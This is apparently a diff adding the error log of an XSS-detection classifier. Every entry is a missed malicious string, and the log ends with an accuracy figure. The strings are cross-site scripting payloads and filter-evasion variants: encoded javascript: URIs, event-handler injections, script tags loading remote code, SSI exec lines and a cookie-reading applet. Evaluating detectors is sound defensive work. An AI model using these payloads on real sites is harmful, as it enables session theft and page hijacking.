@@ -1,0 +1,156 @@
+預測：0，實際：1，字串：javascript:document.location=
+預測：0，實際：1，字串：<A HREF="http://ha.ckers.org@google"></A>
+預測：0，實際：1，字串：document.write
+預測：0，實際：1，字串：SRC="http://ha.ckers.org/.swf" AllowScriptAccess="always"
+預測：0，實際：1，字串：d="alert('');\")";
+預測：0，實際：1，字串：<Input value = "" type = text>
+預測：0，實際：1，字串：<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe
+預測：0，實際：1，字串：document.documentURI
+預測：0，實際：1，字串：<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://.rocks/.js"></SCRIPT>
+預測：0，實際：1，字串：document.URL
+預測：0，實際：1，字串：<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+預測：0，實際：1，字串：<object data="javascript:alert()">
+預測：0，實際：1，字串：<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://.rocks/.js></SCRIPT>'"
+預測：0，實際：1，字串：document.write
+預測：0，實際：1，字串：document.getElementsByClassName("").length
+預測：0，實際：1，字串：<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+預測：0，實際：1，字串：&#x3C
+預測：0，實際：1，字串：<SCRIPT a=">'>" SRC="httx://.rocks/.js"></SCRIPT>
+預測：0，實際：1，字串：b="URL(\"";
+預測：0，實際：1，字串：<INPUT TYPE="IMAGE" SRC="javascript:alert('');">
+預測：0，實際：1，字串：<STYLE>BODY{-moz-binding:url("http://.rocks/moz.xml#")}</STYLE>
+預測：0，實際：1，字串：c="javascript:"
+預測：0，實際：1，字串：<SCRIPT a=">" '' SRC="httx://.rocks/.js"></SCRIPT>
+預測：0，實際：1，字串：tt  p://6	6.000146.0x7.147/"></A>
+預測：0，實際：1，字串：eval(a+b+c+d)
+預測：0，實際：1，字串：<A HREF="//www.google.com/"></A>
+預測：0，實際：1，字串：DATASRC=#I DATAFLD=C DATAFORMATAS=HTML
+預測：0，實際：1，字串：writetitle()
+預測：0，實際：1，字串：<isindex x="javascript:" onmouseover="alert()">
+預測：0，實際：1，字串：http://1113982867/
+預測：0，實際：1，字串：</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>
+預測：0，實際：1，字串：&#x00003C
+預測：0，實際：1，字串：document.getElementsByName("")
+預測：0，實際：1，字串：<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT> 
+預測：0，實際：1，字串：<script>  setTimeout(\\"writetitle()\\",$\_GET\[\]) </script>
+預測：0，實際：1，字串：<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+預測：0，實際：1，字串：<SCRIPT SRC=//.rocks/.j>
+預測：0，實際：1，字串：document.write
+預測：0，實際：1，字串：<IMG onmouseover="alert('xxs')">
+預測：0，實際：1，字串：<A HREF="http://1113982867/"></A>
+預測：0，實際：1，字串：<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://.rocks/.js></SCRIPT>'"-->
+預測：0，實際：1，字串：document.querySelector("")
+預測：0，實際：1，字串：<iframe src=http://.rocks/scriptlet.html <
+預測：0，實際：1，字串：top[“al”+”ert”](1)
+預測：0，實際：1，字串：<A HREF="http://0x42.0x0000066.0x7.0x93/"></A>
+預測：0，實際：1，字串：<SCRIPT a=">" SRC="httx://.rocks/.js"></SCRIPT>
+預測：0，實際：1，字串：<IMG SRC="jav&#x0A;ascript:alert('');">
+預測：0，實際：1，字串：document.getElementsByClassName("").length
+預測：0，實際：1，字串：<applet code="javascript:confirm(document.cookie);">
+預測：0，實際：1，字串：al\u0065rt(1)
+預測：0，實際：1，字串：<IMG SRC="javascript:alert('');">
+預測：0，實際：1，字串：<BR SIZE="&{alert('')}">
+預測：0，實際：1，字串：<iframe/src="data:text/html,<svg onload=alert(1)>">
+預測：0，實際：1，字串：<IMG LOWSRC="javascript:alert('')">
+預測：0，實際：1，字串：<A HREF="//google"></A>
+預測：0，實際：1，字串：0x42.0x0000066.0x7.0x93/
+預測：0，實際：1，字串：top[‘al\x65rt’](1)
+預測：0，實際：1，字串：document.documentURI
+預測：0，實際：1，字串：<SCRIPT =">" SRC="httx://.rocks/.js"></SCRIPT>
+預測：0，實際：1，字串：document.documentURI
+預測：0，實際：1，字串：<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"> <?import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" to="<SCRIPT DEFER>alert("")</SCRIPT>">
+預測：0，實際：1，字串：document.getElementsByName("")
+預測：0，實際：1，字串：document.scripts.length
+預測：0，實際：1，字串：<IMG SRC="jav&#x0D;ascript:alert('');">
+預測：0，實際：1，字串：onFocus()
+預測：0，實際：1，字串：<Video> <source onerror = "javascript: alert ()">
+預測：0，實際：1，字串：<IMG SRC=# onmouseover="alert('xxs')">
+預測：0，實際：1，字串：<IMG SRC="jav&#x09;ascript:alert('');">
+預測：0，實際：1，字串：d="alert('');\")"
+預測：0，實際：1，字串：document.write()
+預測：0，實際：1，字串：document.querySelector("")
+預測：0，實際：1，字串：document.write(213)
+預測：0，實際：1，字串：<LINK REL="stylesheet" HREF="javascript:alert('');">
+預測：0，實際：1，字串：document.write
+預測：0，實際：1，字串：< STYLE=":expression(alert(''))">
+預測：0，實際：1，字串：<body onresize="alert(1)">
+預測：0，實際：1，字串：<SCRIPT a=`>` SRC="httx://.rocks/.js"></SCRIPT>
+預測：0，實際：1，字串：<IMG SRC=" &#14;  javascript:alert('');">
+預測：0，實際：1，字串：d="alert('');\")"; 
+預測：0，實際：1，字串：<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"></A>
+預測：0，實際：1，字串：<SCRIPT SRC="http://.rocks/.jpg"></SCRIPT>
+預測：0，實際：1，字串：<Img src = x onerror = "javascript: window.onerror = alert; throw ">
+預測：0，實際：1，字串：document.documentElement.nodeName
+預測：0，實際：1，字串：<body onhashchange="alert(1)">
+預測：0，實際：1，字串：document.scripts.length
+預測：0，實際：1，字串：document.write(sadfsa)
+預測：0，實際：1，字串：tYPE="text/x-scriptlet" DATA="http://.rocks/scriptlet.html
+預測：0，實際：1，字串：<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+預測：0，實際：1，字串：<STYLE>@im\port'\ja\vasc\ript:alert("")';</STYLE>
+預測：0，實際：1，字串：<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+預測：0，實際：1，字串：tYPE="text/x-scriptlet" DATA="http://.rocks/scriptlet.html
+預測：0，實際：1，字串：document.write()
+預測：0，實際：1，字串：a="get";
+預測：0，實際：1，字串：&#X000003C;
+預測：0，實際：1，字串：document.scripts.length
+預測：0，實際：1，字串：<form><a href="javascript:\u0061lert(1)">X
+預測：0，實際：1，字串：document.URL
+預測：0，實際：1，字串：document.documentElement.nodeName
+預測：0，實際：1，字串：document.getElementsByName("")
+預測：0，實際：1，字串：<BGSOUND SRC="javascript:alert('');">
+預測：0，實際：1，字串：<LINK REL="stylesheet" HREF="http://.rocks/.css">
+預測：0，實際：1，字串：javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+預測：0，實際：1，字串：<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+預測：0，實際：1，字串：<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+預測：0，實際：1，字串：<body onresize="alert(1)">
+預測：0，實際：1，字串：top[‘al\145rt’](1)
+預測：0，實際：1，字串：x000003C
+預測：0，實際：1，字串：<A HREF="http://0102.0146.0007.00000223/"></A>
+預測：0，實際：1，字串：<A HREF="http://google:ha.ckers.org"></A>
+預測：0，實際：1，字串：<BODY BACKGROUND="javascript:alert('')">
+預測：0，實際：1，字串：setTimeout(
+預測：0，實際：1，字串：<SCRIPT/SRC="http://.rocks/.js"></SCRIPT>
+預測：0，實際：1，字串：RC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"
+預測：0，實際：1，字串：<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('')</SCRIPT>">
+預測：0，實際：1，字串：<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+預測：0，實際：1，字串：META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('')</SCRIPT>">
+預測：0，實際：1，字串：<!--#exec cmd="/bin/echo '<SCR'"-->
+預測：0，實際：1，字串：/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+預測：0，實際：1，字串：SRC="test.xml" ID=I
+預測：0，實際：1，字串：document.getElementsByClassName("").length
+預測：0，實際：1，字串：<!--#exec cmd="/bin/echo 'IPT SRC=http://.rocks/.js>
+預測：0，實際：1，字串：<IMG SRC="jav	ascript:alert('');">
+預測：0，實際：1，字串：<SCRIPT/ SRC="http://.rocks/.js"></SCRIPT>
+預測：0，實際：1，字串：document.write
+預測：0，實際：1，字串：<IMG SRC="`<javascript:alert>`('')"
+預測：0，實際：1，字串：<body onbeforeunload="location='javascript:alert(1)'">
+預測：0，實際：1，字串：setTimeout(\\"writetitle()\\",$\_GET\[\])
+預測：0，實際：1，字串：top[8680439..toString(30)](1)
+預測：0，實際：1，字串：<IMG SRC= onmouseover="alert('xxs')">
+預測：0，實際：1，字串：document.URL
+預測：0，實際：1，字串：<STYLE>@import'http://.rocks/.css';</STYLE>
+預測：0，實際：1，字串：document.documentElement.nodeName
+預測：0，實際：1，字串：<IMG SRC="livescript:[code]">
+預測：0，實際：1，字串：document.querySelector("")
+預測：0，實際：1，字串：AllowScriptAccess="always"
+預測：0，實際：1，字串：javascript:document.location='http://www.google.com/
+預測：0，實際：1，字串：< STYLE="behavior: url(.htc);">
+預測：0，實際：1，字串：<SCRIPT SRC=http://.rocks/.js?< B >
+預測：0，實際：1，字串：document.write()
+預測：0，實際：1，字串：<SPAN DATASRC="#" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+預測：0，實際：1，字串：<IMG DYNSRC="javascript:alert('')">
+預測：0，實際：1，字串：<body onhashchange="alert(1)">
+預測：0，實際：1，字串：SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode
+預測：0，實際：1，字串：<SCRIPT "a='>'" SRC="httx://.rocks/.js"></SCRIPT>
+預測：0，實際：1，字串：<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
+預測：0，實際：1，字串：¼script¾alert(¢¢)¼/script¾
+預測：0，實際：1，字串：<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
+預測：0，實際：1，字串：<IMG SRC='vbscript:msgbox("")'>
+預測：0，實際：1，字串："><iframe src="javascript:alert()">
+預測：0，實際：1，字串：'print "<IMG SRC=java\0script:alert(\"\")>";' >
+預測：0，實際：1，字串：?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+預測：0，實際：1，字串：<IMG STYLE=":expr/**/ession(alert(''))">
+預測：0，實際：1，字串：<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+預測：0，實際：1，字串：<A HREF="http://66.102.7.147/"></A>
+預測：0，實際：1，字串：<META HTTP-EQUIV="Link" Content="<http://.rocks/.css>; REL=stylesheet">
+準確率：98.87%
